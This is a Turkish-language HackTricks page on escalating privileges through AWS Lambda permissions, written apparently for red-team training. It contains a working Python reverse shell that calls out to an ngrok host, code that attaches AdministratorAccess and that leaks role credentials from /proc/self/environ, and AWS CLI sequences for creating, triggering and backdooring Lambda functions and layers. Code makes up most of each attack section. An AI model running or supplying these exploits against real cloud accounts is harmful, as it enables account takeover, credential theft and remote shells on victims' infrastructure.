# AWS - Lambda Privilegesi Yükseltme

<details>

<summary><strong>Sıfırdan kahraman olacak şekilde AWS hacklemeyi öğrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Kırmızı Takım Uzmanı)</strong></a><strong>!</strong></summary>

HackTricks'i desteklemenin diğer yolları:

* **Şirketinizi HackTricks'te reklamını görmek istiyorsanız** veya **HackTricks'i PDF olarak indirmek istiyorsanız** [**ABONELİK PLANLARI'na**](https://github.com/sponsors/carlospolop) göz atın!
* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
* [**PEASS Ailesi'ni**](https://opensea.io/collection/the-peass-family) keşfedin, özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuzu
* **Katılın** 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) veya bizi **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**'da takip edin.**
* **Hacking püf noktalarınızı paylaşarak PR göndererek** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarına katkıda bulunun.

</details>

## lambda

Lambda hakkında daha fazla bilgi için:

{% content-ref url="../../aws-security/aws-services/aws-lambda-enum.md" %}
[aws-lambda-enum.md](../../aws-security/aws-services/aws-lambda-enum.md)
{% endcontent-ref %}

### `iam:PassRole`, `lambda:CreateFunction`, (`lambda:InvokeFunction` | `lambda:InvokeFunctionUrl`)

**`iam:PassRole`, `lambda:CreateFunction` ve `lambda:InvokeFunction`** izinlerine sahip kullanıcılar ayrıcalıklarını yükseltebilir.\
**Varolan bir IAM rolünü yeni bir Lambda işlevine atayarak** işlevi o rolle ilişkilendirilen izinlerle donatabilirler. Kullanıcı daha sonra bu Lambda işlevine **kod yazabilir ve yükleyebilir (örneğin bir ters shell)**.\
İşlev kurulduktan sonra kullanıcı, Lambda işlevini AWS API aracılığıyla çağırarak işlevi tetikleyebilir ve amaçlanan eylemleri gerçekleştirebilir. Bu yaklaşım, kullanıcının, ona ilişkilendirilen IAM rolüne verilen erişim düzeyi ile işlem yapmasına izin vererek görevleri dolaylı olarak Lambda işlevi aracılığıyla gerçekleştirmesine olanak tanır.\\

Bir saldırgan bunu kullanarak bir **ters shell alıp belirteci çalabilir**:

{% code title="rev.py" %}
```python
import socket,subprocess,os,time
def lambda_handler(event, context):
s = socket.socket(socket.AF_INET,socket.SOCK_STREAM);
s.connect(('4.tcp.ngrok.io',14305))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
p=subprocess.call(['/bin/sh','-i'])
time.sleep(900)
return 0
```
{% endcode %}
```bash
# Zip the rev shell
zip "rev.zip" "rev.py"

# Create the function
aws lambda create-function --function-name my_function \
--runtime python3.9 --role <arn_of_lambda_role> \
--handler rev.lambda_handler --zip-file fileb://rev.zip

# Invoke the function
aws lambda invoke --function-name my_function output.txt
## If you have the lambda:InvokeFunctionUrl permission you need to expose the lambda inan URL and execute it via the URL

# List roles
aws iam list-attached-user-policies --user-name <user-name>
```
Ayrıca, lambda rol izinlerini lambda işlevinden **kötüye kullanabilirsiniz**. Eğer lambda rol yeterli izinlere sahipse, bunu kullanarak size yönetici hakları verebilirsiniz:
```python
import boto3
def lambda_handler(event, context):
client = boto3.client('iam')
response = client.attach_user_policy(
UserName='my_username',
PolicyArn='arn:aws:iam::aws:policy/AdministratorAccess'
)
return response
```
Ayrıca, dış bir bağlantıya ihtiyaç duymadan lambda'nın rol kimlik bilgilerini sızdırmak da mümkündür. Bu, iç görevlerde kullanılan **Ağdan izole edilmiş Lambdalar** için faydalı olacaktır. Eğer ters kabuklarınızı filtreleyen bilinmeyen güvenlik grupları varsa, bu kod parçası size doğrudan kimlik bilgilerini lambda'nın çıktısı olarak sızdırmanıza olanak tanıyacaktır.
```python
def handler(event, context):
sessiontoken = open('/proc/self/environ', "r").read()
return {
'statusCode': 200,
'session': str(sessiontoken)
}
```

```bash
aws lambda invoke --function-name <lambda_name> output.txt
cat output.txt
```
**Potansiyel Etki:** Belirtilen keyfi lambda hizmet rolüne doğrudan ayrıcalık yükseltme.

{% hint style="danger" %}
Dikkat edin, **`lambda:InvokeAsync`**'in ilginç görünmesine rağmen, **`aws lambda invoke-async`**'i yürütmeye izin vermez, ayrıca `lambda:InvokeFunction`'a da ihtiyacınız vardır.
{% endhint %}

### `iam:PassRole`, `lambda:CreateFunction`, `lambda:AddPermission`

Önceki senaryoda olduğu gibi, **`lambda:AddPermission`** iznine sahipseniz, kendinize **`lambda:InvokeFunction`** iznini verebilirsiniz.
```bash
# Check the previous exploit and use the following line to grant you the invoke permissions
aws --profile "$NON_PRIV_PROFILE_USER" lambda add-permission --function-name my_function \
--action lambda:InvokeFunction --statement-id statement_privesc --principal "$NON_PRIV_PROFILE_USER_ARN"
```
**Potansiyel Etki:** Belirtilen keyfi lambda hizmet rolüne doğrudan ayrıcalık yükseltme.

### `iam:PassRole`, `lambda:CreateFunction`, `lambda:CreateEventSourceMapping`

**`iam:PassRole`, `lambda:CreateFunction` ve `lambda:CreateEventSourceMapping`** izinlerine sahip kullanıcılar (ve potansiyel olarak `dynamodb:PutItem` ve `dynamodb:CreateTable`), `lambda:InvokeFunction` olmadan bile ayrıcalıkları dolaylı olarak **yükseltebilirler**.\
Kötü niyetli kod içeren bir Lambda işlevi oluşturabilir ve var olan bir IAM rolünü atayabilirler.

Lambda'yı doğrudan çağırmak yerine, kullanıcı bir DynamoDB tablosu kurar veya var olan bir tabloyu kullanarak, bu tabloyu Lambda'ya bir olay kaynağı eşlemesi aracılığıyla bağlar. Bu kurulum, Lambda işlevinin tabloya yeni bir öğe girişi yapıldığında otomatik olarak tetiklendiğinden emin olur, bu işlem kullanıcının eylemi veya başka bir işlem tarafından gerçekleştirilir ve böylece Lambda işlevi dolaylı olarak çağrılır ve geçilen IAM rolünün izinleriyle kodu yürütür.
```bash
aws lambda create-function --function-name my_function \
--runtime python3.8 --role <arn_of_lambda_role> \
--handler lambda_function.lambda_handler \
--zip-file fileb://rev.zip
```
Eğer DynamoDB zaten AWS ortamında etkinse, kullanıcı yalnızca Lambda işlevi için olay kaynağı eşlemesini **kurmalıdır**. Ancak, DynamoDB kullanılmıyorsa, kullanıcı **etkinleştirilmiş akışa sahip yeni bir tablo oluşturmalıdır**:
```bash
aws dynamodb create-table --table-name my_table \
--attribute-definitions AttributeName=Test,AttributeType=S \
--key-schema AttributeName=Test,KeyType=HASH \
--provisioned-throughput ReadCapacityUnits=5,WriteCapacityUnits=5 \
--stream-specification StreamEnabled=true,StreamViewType=NEW_AND_OLD_IMAGES
```
Şimdi Lambda işlevini DynamoDB tablosuna bağlamak mümkün, bunun için bir olay kaynağı eşlemesi oluşturarak:
```bash
aws lambda create-event-source-mapping --function-name my_function \
--event-source-arn <arn_of_dynamodb_table_stream> \
--enabled --starting-position LATEST
```
Lambda fonksiyonu DynamoDB akışına bağlandığında, saldırgan DynamoDB akışını etkinleştirerek Lambda'yı **dolaylı olarak tetikleyebilir**. Bu, DynamoDB tablosuna bir öğe **ekleyerek** gerçekleştirilebilir:
```bash
aws dynamodb put-item --table-name my_table \
--item Test={S="Random string"}
```
**Potansiyel Etki:** Belirtilen lambda hizmet rolüne doğrudan ayrıcalık yükseltme.

### `lambda:AddPermission`

Bu izne sahip bir saldırgan, kendisine (veya başkalarına) herhangi bir izni **verebilir** (bu, kaynağa erişim izni vermek için kaynak tabanlı politikalar oluşturur):

{% code overflow="wrap" %}
```bash
# Give yourself all permissions (you could specify granular such as lambda:InvokeFunction or lambda:UpdateFunctionCode)
aws lambda add-permission --function-name <func_name> --statement-id asdasd --action '*' --principal arn:<your user arn>

# Invoke the function
aws lambda invoke --function-name <func_name> /tmp/outout
```
{% endcode %}

**Potansiyel Etki:** Kodu değiştirme ve çalıştırma iznini vererek kullanılan lambda hizmet rolüne doğrudan ayrıcalık yükseltme.

### `lambda:AddLayerVersionPermission`

Bu izne sahip bir saldırgan, kendisine (veya başkalarına) `lambda:GetLayerVersion` iznini **vereblir**. Katmana erişebilir ve zafiyetleri veya hassas bilgileri arayabilir.
```bash
# Give everyone the permission lambda:GetLayerVersion
aws lambda add-layer-version-permission --layer-name ExternalBackdoor --statement-id xaccount --version-number 1 --principal '*' --action lambda:GetLayerVersion
```
{% endcode %}

**Potansiyel Etki:** Hassas bilgilere erişim potansiyeli.

### `lambda:UpdateFunctionCode`

**`lambda:UpdateFunctionCode`** iznine sahip kullanıcılar, **IAM rolüne bağlı olan mevcut bir Lambda işlevinin kodunu değiştirme potansiyeline sahiptir.**\
Saldırgan, **IAM kimlik bilgilerini dışa aktarmak için lambdanın kodunu değiştirebilir**.

Saldırganın işlevi doğrudan çağırma yeteneği olmasa da, Lambda işlevi önceden var olan ve işlevsel olduğunda, mevcut iş akışları veya olaylar aracılığıyla değiştirilmiş kodun yürütülmesini dolaylı olarak kolaylaştırabileceği olasıdır.

{% code overflow="wrap" %}
```bash
# Thezip should contain the lambda code (trick: DOwnload the current one and add your code there)
aws lambda update-function-code --function-name target_function \
--zip-file fileb:///my/lambda/code/zipped.zip

# If you have invoke permissions:
aws lambda invoke --function-name my_function output.txt

# If not check if it's exposed in any URL or via an API gateway you could access
```
{% endcode %}

**Potansiyel Etki:** Kullanılan lambda hizmet rolüne doğrudan ayrıcalık yükseltme.

### `lambda:UpdateFunctionConfiguration`

#### Tanıtım

[**Lambda Katmanları**](https://docs.aws.amazon.com/lambda/latest/dg/configuration-layers.html), **kodunuzu** lambda işlevinize dahil etmenizi sağlar ancak bunu **ayrı bir şekilde depolar**, böylece işlev kodu küçük kalabilir ve **birkaç işlev kodu paylaşabilir**.

Lambda içinde, aşağıdaki gibi bir işlevle nereden python kodunun yüklendiğini kontrol edebilirsiniz:
```python
import json
import sys

def lambda_handler(event, context):
print(json.dumps(sys.path, indent=2))
```
Bu yerlerdir:

1. /var/task
2. /opt/python/lib/python3.7/site-packages
3. /opt/python
4. /var/runtime
5. /var/lang/lib/python37.zip
6. /var/lang/lib/python3.7
7. /var/lang/lib/python3.7/lib-dynload
8. /var/lang/lib/python3.7/site-packages
9. /opt/python/lib/python3.7/site-packages
10. /opt/python

Örneğin, boto3 kütüphanesi `/var/runtime/boto3` (4. pozisyon) konumundan yüklenir.

#### Sömürü

`lambda:UpdateFunctionConfiguration` iznini kötüye kullanarak bir lambda işlevine **yeni bir katman eklemek** mümkündür. Keyfi kodu yürütmek için bu katmanın, lambda'nın içe aktaracağı **bir kütüphaneyi içermesi** gerekir. Lambda'nın kodunu okuyabiliyorsanız, bunu kolayca bulabilirsiniz, ayrıca lambda'nın **zaten bir katmanı kullandığı** ve bu katmanı **indirip** içine **kodunuzu ekleyebileceğiniz** olasılığı da olabilir.

Örneğin, lambda'nın boto3 kütüphanesini kullandığını varsayalım, bu, kütüphanenin en son sürümüyle yerel bir katman oluşturacaktır:
```
pip3 install -t ./lambda_layer boto3
```
You can open `./lambda_layer/boto3/__init__.py` and **add the backdoor in the global code** (a function to exfiltrate credentials or get a reverse shell for example).

Then, zip that `./lambda_layer` directory and **upload the new lambda layer** in your own account (or in the victims one, but you might not have permissions for this).\
Note that you need to create a python folder and put the libraries in there to override /opt/python/boto3. Also, the layer needs to be **compatible with the python version** used by the lambda and if you upload it to your account, it needs to be in the **same region:**

{% code overflow="wrap" %}
```bash
aws lambda publish-layer-version --layer-name "boto3" --zip-file file://backdoor.zip --compatible-architectures "x86_64" "arm64" --compatible-runtimes "python3.9" "python3.8" "python3.7" "python3.6"
```
{% endcode %}

Şimdi, yüklenen lambda katmanını **herhangi bir hesap tarafından erişilebilir hale getirin**:
```bash
aws lambda add-layer-version-permission --layer-name boto3 \
--version-number 1 --statement-id public \
--action lambda:GetLayerVersion --principal *
```
Ve kurban lambda işlevine lambda katmanını ekleyin:
```bash
aws lambda update-function-configuration \
--function-name <func-name> \
--layers arn:aws:lambda:<region>:<attacker-account-id>:layer:boto3:1 \
--timeout 300 #5min for rev shells
```
Sonraki adım, **fonksiyonu kendimiz çağırabilirsek** çağırmak ya da normal yollarla **çağrılmasını beklemek** olacaktır - ki bu daha güvenli bir yöntemdir.

Bu zafiyeti **daha gizli bir şekilde sömürmenin** yolu şurada bulunabilir:

{% content-ref url="../aws-persistence/aws-lambda-persistence/aws-lambda-layers-persistence.md" %}
[aws-lambda-layers-persistence.md](../aws-persistence/aws-lambda-persistence/aws-lambda-layers-persistence.md)
{% endcontent-ref %}

**Potansiyel Etki:** Kullanılan lambda hizmet rolüne doğrudan ayrıcalık yükseltme.

### `?iam:PassRole`, `lambda:CreateFunction`, `lambda:CreateFunctionUrlConfig`, `lambda:InvokeFunctionUrl`

Belki de bu izinlerle bir fonksiyon oluşturabilir ve URL'yi çağırarak çalıştırabilirsiniz... ama bunu test etmek için bir yol bulamadım, bu yüzden yapabilirseniz bana bildirin!

### Lambda MitM

Bazı lambdalar **kullanıcılardan parametrelerde hassas bilgiler alacaklar.** Bunlardan birinde RCE alırsanız, diğer kullanıcıların gönderdiği bilgileri dışarı çıkarabilirsiniz, bunu kontrol edin:

{% content-ref url="../aws-post-exploitation/aws-lambda-post-exploitation/aws-warm-lambda-persistence.md" %}
[aws-warm-lambda-persistence.md](../aws-post-exploitation/aws-lambda-post-exploitation/aws-warm-lambda-persistence.md)
{% endcontent-ref %}

## Referanslar

* [https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/](https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/)
* [https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation-part-2/](https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation-part-2/)

<details>

<summary><strong>Sıfırdan kahraman olmak için AWS hackleme öğrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

HackTricks'i desteklemenin diğer yolları:

* **Şirketinizi HackTricks'te reklamını görmek istiyorsanız** veya **HackTricks'i PDF olarak indirmek istiyorsanız** [**ABONELİK PLANLARI**](https://github.com/sponsors/carlospolop)'na göz atın!
* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
* [**The PEASS Family'yi**](https://opensea.io/collection/the-peass-family) keşfedin, özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
* 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katılın** veya bizi **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**'da takip edin.**
* **Hacking püf noktalarınızı paylaşarak** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarına PR göndererek paylaşın.

</details>
